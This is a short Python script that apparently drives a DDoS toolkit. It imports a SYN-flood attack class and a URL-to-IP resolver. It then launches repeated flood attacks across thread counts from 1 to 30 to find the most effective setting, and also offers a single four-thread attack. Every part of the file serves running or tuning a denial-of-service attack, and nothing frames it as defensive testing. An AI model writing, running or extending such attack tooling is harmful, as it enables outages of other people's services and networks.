import time
from utils.ip_from_url_app.run import run_ip_from_url_app
from ddos.attacks.l4_attack import L4SYNAttack
from utils.analyses.l4_analyses import search_best_thrds_num

# Test n attack series for search best params
def attack_series(n: int = 10):
    l4syn_attack = L4SYNAttack()
    threads = [1, 2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30]
    for thread_num in threads:
        for i in range(n):
            l4syn_attack.attack(num_threads=thread_num)
            time.sleep(10)
    search_best_thrds_num()

# Test single attack
def attack():
    l4syn_attack = L4SYNAttack()
    l4syn_attack.attack(num_threads=4)

# Test get ip address from url app
def search_ip():
    ip_from_url_app = "utils.ip_from_url_app.app.main"
    run_ip_from_url_app(ip_from_url_app)